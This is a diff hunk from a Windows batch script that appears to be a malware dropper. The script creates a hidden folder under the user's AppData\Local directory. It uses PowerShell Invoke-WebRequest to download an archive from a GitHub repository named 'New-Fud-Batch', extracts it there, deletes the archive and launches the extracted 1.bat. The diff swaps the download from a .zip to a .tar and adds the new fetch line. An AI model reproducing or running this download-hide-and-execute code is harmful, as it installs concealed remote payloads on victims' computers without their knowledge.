@@ -19,13 +19,13 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip' -OutFile .zip"
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-tar -xf .zip
-del .zip
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/blob/main/.tar' -OutFile .tar"
+tar -xf .tar
+del .tar
 
 start C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"
 
